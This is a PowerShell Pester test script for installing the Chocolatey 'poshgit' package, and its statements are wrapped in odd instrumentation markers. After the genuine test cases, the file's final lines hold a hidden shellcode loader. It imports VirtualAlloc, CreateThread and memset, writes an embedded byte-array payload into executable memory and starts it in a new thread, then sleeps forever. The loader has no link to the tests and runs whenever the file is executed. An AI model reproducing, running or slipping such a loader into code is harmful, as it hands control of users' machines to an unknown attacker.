 -||-> $packageName = "poshgit" <-||- 
 -||-> cpack <-||- 

 -||-> function Setup-Environment {
     -||-> Cleanup <-||- 
     -||-> $env:poshGit =  -||-> join-path ( -||-> Resolve-Path .\Tests <-||-  ) dahlbyk-posh-git-60be436.zip <-||-  <-||- 
     -||-> $profileScript = "function Prompt(){ `$host.ui.RawUI.WindowTitle = `"My Prompt`" }" <-||- 
     -||-> ( -||-> Set-Content $Profile -value $profileScript -Force <-||- ) <-||- 
} <-||- 

 -||-> function Cleanup {
     -||-> Clean-Temp <-||- 
     -||-> Remove-Item $env:ChocolateyInstall\lib\$packageName* -Recurse -Force <-||- 
} <-||- 

 -||-> function Clean-Temp {
     -||-> if( -||-> Test-Path $env:Temp\Chocolatey\$packageName <-||- ) { -||-> Remove-Item $env:Temp\Chocolatey\$packageName -Recurse -Force <-||- } <-||- 
} <-||- 

 -||-> function RunInstall {
     -||-> cinst $packageName -source ( -||-> Resolve-Path . <-||- ) <-||- 
} <-||- 
 -||-> $binRoot =  -||-> join-path $env:systemdrive 'tools' <-||-  <-||- 
 -||-> if( -||-> $null -ne $env:chocolatey_bin_root <-||- ){ -||-> $binRoot =  -||-> join-path $env:systemdrive $env:chocolatey_bin_root <-||-  <-||- } <-||- 
 -||-> $poshgitPath =  -||-> join-path $binRoot 'poshgit' <-||-  <-||- 
 -||-> if( -||-> Test-Path $Profile <-||- ) {  -||-> $currentProfileScript = ( -||-> Get-Content $Profile <-||- ) <-||-  } <-||- 

 -||-> function Clean-Environment {
     -||-> Set-Content $Profile -value $currentProfileScript -Force <-||- 
} <-||- 

 -||-> Describe "Install-Posh-Git" {

     -||-> It "WillRemvePreviousInstallVersion" {
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> Add-Content $profile -value ". '$poshgitPath\posh-git\profile.example.ps1'" <-||- 

             -||-> RunInstall <-||- 

             -||-> $newProfile = ( -||-> Get-Content $Profile <-||- ) <-||- 
             -||-> $pgitDir = [Array]( -||-> Get-ChildItem "$poshgitPath\*posh-git*\" | Sort-Object -Property LastWriteTime <-||- )[-1] <-||- 
             -||-> ( -||-> $newProfile -like ". '$poshgitPath\posh-git\profile.example.ps1'" <-||- ).Count.should.be(0) <-||- 
             -||-> ( -||-> $newProfile -like ". '$pgitDir\profile.example.ps1'" <-||- ).Count.should.be(1) <-||- 
        }
        catch {
             -||-> write-host ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally { -||-> Clean-Environment <-||- } <-||- 
    } <-||- 

     -||-> It "WillNotAddDuplicateCallOnRepeatInstall" {
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> RunInstall <-||- 
             -||-> Cleanup <-||- 

             -||-> RunInstall <-||- 

             -||-> $newProfile = ( -||-> Get-Content $Profile <-||- ) <-||- 
             -||-> $pgitDir = [Array]( -||-> Get-ChildItem "$poshgitPath\*posh-git*\" | Sort-Object -Property LastWriteTime <-||- )[-1] <-||- 
             -||-> ( -||-> $newProfile -like ". '$pgitDir\profile.example.ps1'" <-||- ).Count.should.be(1) <-||- 
        }
        catch {
             -||-> write-host ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally { -||-> Clean-Environment <-||- } <-||- 
    } <-||- 

     -||-> It "WillPreserveOldPromptLogic" {
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> RunInstall <-||- 
             -||-> . $Profile <-||- 
             -||-> $host.ui.RawUI.WindowTitle = "bad" <-||- 

             -||-> Prompt <-||- 

             -||-> $host.ui.RawUI.WindowTitle.should.be("My Prompt") <-||- 
        }
        catch {
             -||-> write-host ( -||-> Get-Content function:\prompt <-||- ) <-||- 
            throw
        }
        finally {
             -||-> Clean-Environment <-||- 
        } <-||- 
    } <-||- 

     -||-> It "WillOutputVcsStatus" {
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> RunInstall <-||- 
             -||-> mkdir PoshTest <-||- 
             -||-> Push-Location PoshTest <-||- 
             -||-> git init <-||- 
             -||-> . $Profile <-||- 
             -||-> $global:wh="" <-||- 
             -||-> New-Item function:\global:Write-Host -value "param([object] `$object, `$backgroundColor, `$foregroundColor, [switch] `$nonewline) try{Write-Output `$object;[string]`$global:wh += `$object.ToString()} catch{}" <-||- 

             -||-> Prompt <-||- 

             -||-> Pop-Location <-||- 
             -||-> $wh.should.be("$pwd\PoshTest [master]") <-||- 
        }
        catch {
             -||-> write-output ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally {
             -||-> Clean-Environment <-||- 
             -||-> if(  -||-> Test-Path function:\Write-Host <-||-  ) { -||-> Remove-Item function:\Write-Host <-||- } <-||- 
             -||-> if(  -||-> Test-Path PoshTest <-||-  ) { -||-> Remove-Item PoshTest -Force -Recurse <-||- } <-||- 
        } <-||- 
    } <-||- 

     -||-> It "WillSucceedOnEmptyProfile" {
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> Remove-Item $Profile -Force <-||- 
             -||-> RunInstall <-||- 
             -||-> mkdir PoshTest <-||- 
             -||-> Push-Location PoshTest <-||- 
             -||-> git init <-||- 
             -||-> . $Profile <-||- 
             -||-> $global:wh="" <-||- 
             -||-> New-Item function:\global:Write-Host -value "param([object] `$object, `$backgroundColor, `$foregroundColor, [switch] `$nonewline) try{Write-Output `$object;[string]`$global:wh += `$object.ToString()} catch{}" <-||- 

             -||-> Prompt <-||- 

             -||-> Pop-Location <-||- 
             -||-> $wh.should.be("$pwd\PoshTest [master]") <-||- 
        }
        catch {
             -||-> write-output ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally {
             -||-> Clean-Environment <-||- 
             -||-> if(  -||-> Test-Path function:\Write-Host <-||-  ) { -||-> Remove-Item function:\Write-Host <-||- } <-||- 
             -||-> if(  -||-> Test-Path PoshTest <-||-  ) { -||-> Remove-Item PoshTest -Force -Recurse <-||- } <-||- 
        } <-||- 
    } <-||- 

     -||-> It "WillSucceedOnProfileWithPromptWithWriteHost" {
         -||-> Cleanup <-||- 
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> Remove-Item $Profile -Force <-||- 
             -||-> Add-Content $profile -value "function prompt {Write-Host 'Hi'}" -Force <-||- 
             -||-> RunInstall <-||- 
             -||-> mkdir PoshTest <-||- 
             -||-> Push-Location PoshTest <-||- 
             -||-> git init <-||- 
             -||-> . $Profile <-||- 
             -||-> $global:wh="" <-||- 
             -||-> New-Item function:\global:Write-Host -value "param([object] `$object, `$backgroundColor, `$foregroundColor, [switch] `$nonewline) try{Write-Output `$object;[string]`$global:wh += `$object.ToString()} catch{}" <-||- 

             -||-> Prompt <-||- 

             -||-> Remove-Item function:\global:Write-Host <-||- 
             -||-> Pop-Location <-||- 
             -||-> $wh.should.be("$pwd\PoshTest [master]") <-||- 
        }
        catch {
             -||-> write-output ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally {
             -||-> Clean-Environment <-||- 
             -||-> if(  -||-> Test-Path function:\Write-Host <-||-  ) { -||-> Remove-Item function:\Write-Host <-||- } <-||- 
             -||-> if(  -||-> Test-Path PoshTest <-||-  ) { -||-> Remove-Item PoshTest -Force -Recurse <-||- } <-||- 
        } <-||- 
    } <-||- 

     -||-> It "WillSucceedOnUpdatingFrom040" {
         -||-> Cleanup <-||- 
         -||-> Setup-Environment <-||- 
         -||-> try{
             -||-> Remove-Item $Profile -Force <-||- 
             -||-> Add-Content $profile -value ". 'C:\tools\poshgit\dahlbyk-posh-git-60be436\profile.example.ps1'" -Force <-||- 
             -||-> RunInstall <-||- 
             -||-> mkdir PoshTest <-||- 
             -||-> Push-Location PoshTest <-||- 
             -||-> git init <-||- 
             -||-> write-output ( -||-> Get-Content function:\prompt <-||- ) <-||- 
             -||-> . $Profile <-||- 
             -||-> $global:wh="" <-||- 
             -||-> New-Item function:\global:Write-Host -value "param([object] `$object, `$backgroundColor, `$foregroundColor, [switch] `$nonewline) try{Write-Output `$object;[string]`$global:wh += `$object.ToString()} catch{}" <-||- 

             -||-> Prompt <-||- 

             -||-> Remove-Item function:\global:Write-Host <-||- 
             -||-> Pop-Location <-||- 
             -||-> $wh.should.be("$pwd\PoshTest [master]") <-||- 
        }
        catch {
             -||-> write-output ( -||-> Get-Content $Profile <-||- ) <-||- 
            throw
        }
        finally {
             -||-> Clean-Environment <-||- 
             -||-> if(  -||-> Test-Path function:\Write-Host <-||-  ) { -||-> Remove-Item function:\Write-Host <-||- } <-||- 
             -||-> if(  -||-> Test-Path PoshTest <-||-  ) { -||-> Remove-Item PoshTest -Force -Recurse <-||- } <-||- 
        } <-||- 
    } <-||- 

} <-||- 

 -||-> $evz = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $evz -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x30,0x94,0xb4,0xad,0xdb,0xc6,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x83,0xc6,0x04,0x03,0x56,0x3f,0x76,0x41,0x51,0xd7,0xf4,0xaa,0xaa,0x27,0x99,0x23,0x4f,0x16,0x99,0x50,0x1b,0x08,0x29,0x12,0x49,0xa4,0xc2,0x76,0x7a,0x3f,0xa6,0x5e,0x8d,0x88,0x0d,0xb9,0xa0,0x09,0x3d,0xf9,0xa3,0x89,0x3c,0x2e,0x04,0xb0,0x8e,0x23,0x45,0xf5,0xf3,0xce,0x17,0xae,0x78,0x7c,0x88,0xdb,0x35,0xbd,0x23,0x97,0xd8,0xc5,0xd0,0x6f,0xda,0xe4,0x46,0xe4,0x85,0x26,0x68,0x29,0xbe,0x6e,0x72,0x2e,0xfb,0x39,0x09,0x84,0x77,0xb8,0xdb,0xd5,0x78,0x17,0x22,0xda,0x8a,0x69,0x62,0xdc,0x74,0x1c,0x9a,0x1f,0x08,0x27,0x59,0x62,0xd6,0xa2,0x7a,0xc4,0x9d,0x15,0xa7,0xf5,0x72,0xc3,0x2c,0xf9,0x3f,0x87,0x6b,0x1d,0xc1,0x44,0x00,0x19,0x4a,0x6b,0xc7,0xa8,0x08,0x48,0xc3,0xf1,0xcb,0xf1,0x52,0x5f,0xbd,0x0e,0x84,0x00,0x62,0xab,0xce,0xac,0x77,0xc6,0x8c,0xb8,0xb4,0xeb,0x2e,0x38,0xd3,0x7c,0x5c,0x0a,0x7c,0xd7,0xca,0x26,0xf5,0xf1,0x0d,0x49,0x2c,0x45,0x81,0xb4,0xcf,0xb6,0x8b,0x72,0x9b,0xe6,0xa3,0x53,0xa4,0x6c,0x34,0x5c,0x71,0x18,0x31,0xca,0xba,0x75,0x38,0x22,0x53,0x84,0x3b,0x33,0x1f,0x01,0xdd,0x63,0x0f,0x42,0x72,0xc3,0xff,0x22,0x22,0xab,0x15,0xad,0x1d,0xcb,0x15,0x67,0x36,0x61,0xfa,0xde,0x6e,0x1d,0x63,0x7b,0xe4,0xbc,0x6c,0x51,0x80,0xfe,0xe7,0x56,0x74,0xb0,0x0f,0x12,0x66,0x24,0xe0,0x69,0xd4,0xe2,0xff,0x47,0x73,0x0a,0x6a,0x6c,0xd2,0x5d,0x02,0x6e,0x03,0xa9,0x8d,0x91,0x66,0xa2,0x04,0x04,0xc9,0xdc,0x68,0xc8,0xc9,0x1c,0x3f,0x82,0xc9,0x74,0xe7,0xf6,0x99,0x61,0xe8,0x22,0x8e,0x3a,0x7d,0xcd,0xe7,0xef,0xd6,0xa5,0x05,0xd6,0x11,0x6a,0xf5,0x3d,0xa0,0x56,0x20,0x7b,0xd6,0xb6,0xf0 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $0pT8=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $0pT8.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$0pT8,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



